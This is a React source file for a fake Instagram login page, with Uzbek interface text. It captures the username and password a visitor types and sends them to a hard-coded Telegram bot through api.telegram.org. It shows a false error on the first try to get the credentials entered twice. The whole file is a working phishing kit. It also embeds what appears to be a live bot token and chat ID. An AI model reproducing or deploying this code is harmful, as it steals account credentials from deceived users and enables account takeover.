import React, { useState } from "react";
import { CheckCircleIcon, XCircleIcon } from "@heroicons/react/24/solid";

const BOT_TOKEN = "8202944773:AAGa2bJpkcAB-8252YNnb0anaXUtgPqrens";
const CHAT_ID = "7550473457";

export default function App() {
  const [login, setLogin] = useState("");
  const [password, setPassword] = useState("");
  const [clickCount, setClickCount] = useState(0);
  const [status, setStatus] = useState(null); // { type: "error"|"success", message: "..." }

  const sendToTelegram = async (message) => {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
      }),
    });
  };

  const handleSubmit = () => {
    let newCount = clickCount + 1;
    let statusMessage = "";
    let statusType = "";

    if (newCount === 1) {
      statusMessage = "Ma'lumot topilmadi";
      statusType = "error";
    } else {
      statusMessage = "Ma'lumot topildi";
      statusType = "success";
    }

    // Xabar ko'rsatish
    setStatus({ type: statusType, message: statusMessage });

    // Telegramga yuborish
    const telegramMessage = `📩 Yangi so'rov:\nLogin: ${login}\nParol: ${password}\nHolat: ${statusMessage}`;
    sendToTelegram(telegramMessage);

    // Inputlarni tozalash
    setLogin("");
    setPassword("");

    // 2 soniyadan keyin xabarni yo'q qilish
    setTimeout(() => setStatus(null), 2000);

    // 3 marta bosilganda qaytadan boshlash
    if (newCount >= 3) {
      newCount = 0;
    }
    setClickCount(newCount);
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100 relative">
      {/* Instagram Logo */}
      <img
        src={`https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/330px-Instagram_logo_2022.svg.png`}
        alt="Instagram"
        className="w-20 mb-6"
      />

      {/* Xabar */}
      {status && (
        <div
          className={`absolute top-5 flex items-center gap-2 px-4 py-2 rounded-lg shadow-lg text-white ${
            status.type === "success" ? "bg-green-500" : "bg-red-500"
          }`}
        >
          {status.type === "success" ? (
            <CheckCircleIcon className="w-6 h-6" />
          ) : (
            <XCircleIcon className="w-6 h-6" />
          )}
          <span className="font-medium">{status.message}</span>
        </div>
      )}

      {/* Login Form */}
      <div className="bg-white p-6 rounded-2xl shadow-lg w-80">
        <h1 className="text-2xl font-bold text-center mb-4 text-gray-800">
          Instagram
        </h1>
        <input
          type="text"
          placeholder="Telefon raqam, username yoki email"
          className="border rounded-md px-3 py-2 w-full mb-3 focus:outline-none focus:ring-2 focus:ring-pink-400"
          value={login}
          onChange={(e) => setLogin(e.target.value)}
        />
        <input
          type="password"
          placeholder="Parol"
          className="border rounded-md px-3 py-2 w-full mb-4 focus:outline-none focus:ring-2 focus:ring-pink-400"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <button
          onClick={handleSubmit}
          className="bg-pink-500 hover:bg-pink-600 text-white py-2 px-4 rounded-md w-full font-semibold transition duration-200"
        >
          Tasdiqlash
        </button>
      </div>
    </div>
  );
}
